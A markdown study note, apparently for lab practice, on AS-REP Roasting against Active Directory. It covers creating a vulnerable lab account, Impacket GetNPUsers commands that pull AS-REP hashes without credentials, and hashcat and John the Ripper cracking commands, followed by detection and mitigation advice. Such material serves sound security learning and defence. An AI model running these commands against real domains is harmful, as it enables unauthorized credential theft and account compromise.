# 🎟️ AS-REP Roasting Attack — Active Directory

> Offensive-Active-Directory / Kerberos-Enumeration / AS-Rep-Roasting-Attack

**Lab:** Forest (Hack The Box)
**Target Environment:** Active Directory
**Objective:** Extract TGTs from user accounts that do not require Kerberos pre-authentication and perform offline password cracking.

---

## 📌 Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Lab Setup (Creating a Vulnerable Account)](#lab-setup-creating-a-vulnerable-account)
- [Attack Execution](#attack-execution)
- [Impacket — GetNPUsers.py Deep Dive](#impacket--getnpuserspy-deep-dive)
- [Hash Cracking](#hash-cracking)
- [Detection and Mitigation](#detection-and-mitigation)
- [References](#references)
- [Kerberoasting vs AS-REP Roasting](#kerberoasting-vs-as-rep-roasting)

---

## Overview

- **AS-REP Roasting** is a Kerberos-based attack that targets domain user accounts configured with the **"Do not require Kerberos preauthentication"** setting.
- In such cases, an attacker can request authentication data from the **Key Distribution Center (KDC)** without providing valid credentials. The response contains encrypted data that can be cracked offline to recover the user's password.

## How It Works

In a standard Kerberos authentication flow, pre-authentication ensures that the client proves knowledge of the password before receiving a response from the KDC.

If pre-authentication is disabled:

1. The attacker sends an authentication request (**AS-REQ**) without credentials.
2. The KDC responds with an **AS-REP** message.
3. The response contains data encrypted using the user's password hash.
4. The attacker extracts the hash and performs offline brute-force or dictionary attacks.

---

## Lab Setup (Creating a Vulnerable Account)

### Start PowerShell with execution policy bypass

```powershell
powershell.exe -nop -ep bypass
```

### Step 1: Define a Password

```powershell
$PASSWORD = ConvertTo-SecureString -AsPlainText -Force -String "Password123"
```

### Step 2: Create a User Account

```powershell
New-ADUser -Name "User-asrep-roast" `
           -SamAccountName "User-asrep-roast" `
           -AccountPassword $PASSWORD `
           -Enabled $true `
           -PasswordNeverExpires $true `
           -Description "AS-REP-Roast vulnerable account"
```

### Step 3: Disable Pre-authentication

```powershell
Set-ADAccountControl -Identity "User-asrep-roast" -DoesNotRequirePreAuth $true
```

### Step 4: Verify Vulnerable Accounts

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**Sample LDAP dump of a vulnerable account** (via `ldapsearch`/similar enumeration):

```
# User-asrep-roast, Users, infosecwarrior.local
dn: CN=User-asrep-roast,CN=Users,DC=infosecwarrior,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: User-asrep-roast
description: AS-REP-Roast vulnerable account
distinguishedName: CN=User-asrep-roast,CN=Users,DC=infosecwarrior,DC=local
instanceType: 4
whenCreated: 20260403101441.0Z
whenChanged: 20260403101854.0Z
sAMAccountName: User-asrep-roast
sAMAccountType: 805306368
userAccountControl: 4260352
```

> Note: `userAccountControl` reflects the `DoesNotRequirePreAuth` flag having been set on the account.

---

## Attack Execution

### Using Impacket (Linux)

```bash
GetNPUsers.py -dc-ip 192.168.2.100 infosecwarrior.local/ -usersfile users.txt -no-pass
```

**Example:**

```bash
GetNPUsers.py -dc-ip 192.168.2.100 infosecwarrior.local/ -usersfile usernames.txt -no-pass
```

**Parameters:**

| Parameter | Description |
|---|---|
| `<DC-IP>` | Domain Controller IP address |
| `users.txt` | File containing target usernames |
| `-no-pass` | Requests AS-REP without authentication |

---

## Impacket — GetNPUsers.py Deep Dive

**Tool:** `GetNPUsers.py`
**Purpose:** Retrieve AS-REP hashes for user accounts configured with **"Do not require Kerberos pre-authentication"**, enabling offline password cracking.

### Overview

`GetNPUsers.py` is part of the **Impacket** toolkit and is used to enumerate and request AS-REP responses from a Domain Controller. If pre-authentication is disabled for a user account, the tool can obtain encrypted data without valid credentials.

### Basic Syntax

```bash
GetNPUsers.py [domain/]username[:password] -dc-ip <domain controller IP> [options]
```

**Display help:**

```bash
impacket-GetNPUsers -h
```

### Common Usage Scenarios

**Enumerate Potentially Vulnerable Users (Unauthenticated):**

```bash
impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.50
```

**Request AS-REP Hashes:**

```bash
GetNPUsers.py -dc-ip 192.168.2.100 infosecwarrior.local/ -usersfile users.txt -no-pass
```

---

## Hash Cracking

### Hashcat

```bash
hashcat -m 18200 asrep_hash.txt /opt/rockyou.txt
```

### John the Ripper

```bash
john --wordlist=/opt/rockyou.txt asrep_hash.txt
```

---

## Detection and Mitigation

### Preventive Measures

- Ensure Kerberos pre-authentication is enabled for all accounts
- Avoid configuring accounts with the **"Do not require pre-authentication"** flag

### Monitoring and Auditing

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

- Monitor for abnormal AS-REQ/AS-REP traffic patterns
- Enable logging for Kerberos authentication events

### Hardening

- Enforce strong password policies
- Implement multi-factor authentication (MFA)
- Regularly audit Active Directory configurations

---

## References

- Harmj0y – Roasting AS-REPs
- Impacket GitHub Repository
- Rubeus GitHub Repository
- MITRE ATT&CK: T1558.004

---

## Kerberoasting vs AS-REP Roasting

### Comparison Table

| Feature / Aspect | AS-REP Roasting | Kerberoasting |
|---|---|---|
| **Target Requirement** | User accounts with pre-authentication disabled (`DoesNotRequirePreAuth = True`) | User accounts with Service Principal Names (SPNs) |
| **Target Scope** | Any user account with misconfiguration | Typically service accounts |
| **Authentication Required** | No authentication required | Requires valid domain user credentials |
| **Captured Data** | AS-REP (Authentication Server Reply) | TGS (Ticket Granting Service ticket) |
| **Encryption Type** | Encrypted with user's password hash (commonly RC4-HMAC) | Encrypted with service account's password hash (RC4-HMAC or AES) |
| **Primary Tools** | `GetNPUsers.py`, Rubeus | `GetUserSPNs.py`, Rubeus |
| **Cracking Method** | Offline password cracking | Offline password cracking |
| **Typical Risk Level** | Lower (often low-privileged users) | Higher (targets service accounts, often privileged) |
| **Common Misconfiguration** | Pre-authentication disabled | Weak passwords on service accounts |

### Conceptual Difference

**AS-REP Roasting:**

- Exploits accounts where Kerberos pre-authentication is disabled
- Allows attackers to request encrypted authentication data without credentials
- Often used in **unauthenticated attack scenarios**

**Kerberoasting:**

- Exploits service accounts associated with SPNs
- Requires a valid domain account to request service tickets
- Commonly used in **post-authentication lateral movement**

### Real-World Analogy

| Scenario | AS-REP Roasting | Kerberoasting |
|---|---|---|
| **Access model** | System responds without verifying identity | System responds after login |
| **Interaction** | Request without authentication | Authenticated request for service |
| **Target secret** | User password | Service account password |

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>
